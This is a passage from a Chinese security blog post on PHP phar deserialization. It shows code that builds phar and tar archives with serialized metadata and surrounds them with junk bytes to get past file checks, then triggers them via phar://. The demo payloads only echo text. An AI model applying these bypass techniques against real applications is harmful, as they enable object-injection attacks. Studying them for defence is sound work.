<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"AAAA"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$dirty</span><span class="token operator">=</span><span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>
<span class="token variable">$old</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/break_phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new</span><span class="token operator">=</span><span class="token variable">$old</span><span class="token operator">.</span><span class="token variable">$dirty</span><span class="token punctuation">;</span>

<span class="token variable">$new</span><span class="token operator">=</span> <span class="token variable">$dirty</span><span class="token operator">.</span><span class="token variable">$old</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/new.phar"</span><span class="token punctuation">,</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar://./phar/new.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692156619033-77cfdd95-a2b5-41ea-9c40-065c84481858.png#averageHue=%2335332e&clientId=ua623733b-247f-4&from=paste&height=251&id=u2ebfe57d&originHeight=376&originWidth=1465&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=269573&status=done&style=none&taskId=u88f0dfd3-9f94-47c2-a361-c2ea92b8b8b&title=&width=976.6666666666666" alt="image.png"></p>
<h5 id="绕过尾部脏数据"><a href="#绕过尾部脏数据" class="headerlink" title="绕过尾部脏数据"></a>绕过尾部脏数据</h5><p>也就是在文件数据尾部拼接脏数据，这个绕过起来就比较方便，不需要知道内容</p>
<blockquote>
<p>使用tar格式自动忽略，因为tar格式有暂停解析位，在之后添加的数据都不会解析的。</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//因为用的tar格式，所以不需要指定stub头</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PharData</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/phar.tar"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phartest"</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PharData的构造函数的参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692154531936-2c2d01b0-cb00-4379-b563-63e4277fed59.png#averageHue=%23efefef&clientId=u60458b09-e038-4&from=paste&height=316&id=ue5ef8245&originHeight=474&originWidth=971&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48902&status=done&style=none&taskId=u255d8354-90b6-42c0-8514-59c42a558c6&title=&width=647.3333333333334" alt="image.png"><br>&#x2F;&#x2F;那个0是啥我还真不知道</p>
<p>触发测试</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"AAAA"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$dirty</span><span class="token operator">=</span><span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>
<span class="token variable">$old</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/phar.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new</span><span class="token operator">=</span><span class="token variable">$old</span><span class="token operator">.</span><span class="token variable">$dirty</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/new.tar"</span><span class="token punctuation">,</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar://./phar/new.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692156429800-a32f4b2c-d7fb-40c4-9959-ae7b2c24b5be.png#averageHue=%2336332e&clientId=ua623733b-247f-4&from=paste&height=225&id=ube0a31dc&originHeight=338&originWidth=1258&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=239607&status=done&style=none&taskId=u4c3c8d55-24af-4484-bdba-abc9b057136&title=&width=838.6666666666666" alt="image.png"></p>
<h5 id="绕过前后脏数据"><a href="#绕过前后脏数据" class="headerlink" title="绕过前后脏数据"></a>绕过前后脏数据</h5><p>两个加起来就行</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//前面的脏数据</span>
<span class="token variable">$dirtydata</span><span class="token operator">=</span><span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PharData</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/phar.tar"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phartest"</span><span class="token punctuation">,</span> <span class="token class-name static-context">Phar</span><span class="token operator">::</span><span class="token constant">TAR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//设置开头数据</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token variable">$dirtydata</span> <span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//读取原文件，截取，删除</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$post_exp</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$dirtydata</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./break_phar.tar"</span><span class="token punctuation">,</span><span class="token variable">$post_exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"AAA"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$front</span><span class="token operator">=</span><span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>
<span class="token variable">$dirty</span><span class="token operator">=</span><span class="token string double-quoted-string">"dirty"</span><span class="token punctuation">;</span>
<span class="token variable">$old</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/break_phar.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$new</span><span class="token operator">=</span><span class="token variable">$front</span><span class="token operator">.</span><span class="token variable">$old</span><span class="token operator">.</span><span class="token variable">$dirty</span><span class="token punctuation">;</span>
<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./phar/new.tar"</span><span class="token punctuation">,</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar://./phar/new.tar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1692157584728-416e2682-d8ab-4815-b813-9c6404b41197.png#averageHue=%23373630&clientId=ua623733b-247f-4&from=paste&height=270&id=ued7cf2db&originHeight=405&originWidth=1308&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=285423&status=done&style=none&taskId=ue8e8bae4-040d-4964-9326-15e80a43f05&title=&width=872" alt="image.png"></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2023/04/24/%E4%B8%80%E6%9D%A1%E6%8A%BD%E8%B1%A1%E7%9A%84equals%E8%A7%A6%E5%8F%91%E9%93%BE/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>Prev</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
              2023-08-29 19:40:44
            </span>
            
          </div>
          <div class="post-foot-prev">
            
              <a href="/2023/05/26/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_self">
                <span>Next</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">Contents</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stub"><span class="toc-text">stub</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#manifest-describing-the-contents"><span class="toc-text">manifest describing the contents</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#the-file-contents"><span class="toc-text">the file contents</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><span class="toc-text">[optional] a signature for verifying Phar integrity (phar file format only)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo"><span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91"><span class="toc-text">触发</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0"><span class="toc-text">一些常规函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stream-API"><span class="toc-text">Stream API</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exif"><span class="toc-text">exif</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gd"><span class="toc-text">gd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hash"><span class="toc-text">hash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file-x2F-url"><span class="toc-text">file &#x2F; url</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#standard"><span class="toc-text">standard</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#zip"><span class="toc-text">zip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Postgres"><span class="toc-text">Postgres</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql"><span class="toc-text">Mysql</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80bypass"><span class="toc-text">基础bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87wakeup"><span class="toc-text">绕过wakeup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E8%84%8F%E6%95%B0%E6%8D%AE%E7%BB%95%E8%BF%87"><span class="toc-text">phar脏数据绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A4%B4%E9%83%A8%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-text">绕过头部脏数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%B0%BE%E9%83%A8%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-text">绕过尾部脏数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%89%8D%E5%90%8E%E8%84%8F%E6%95%B0%E6%8D%AE"><span class="toc-text">绕过前后脏数据</span></a></li></ol></li></ol></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src='https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js' onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'bNa2jesvrDl0f51DIPiFWHCO-gzGzoHsz',
        appKey: 'UfLQ40Ou8xWfDtBEct4Yxct1',
        placeholder: 'welcome!',
        avatar: 'retro',
        lang: 'en'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="Search...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96--phar%E7%AF%87 + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F04%2F24%2Fphp%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596-phar%25E7%25AF%2587%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-phar%E7%AF%87/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
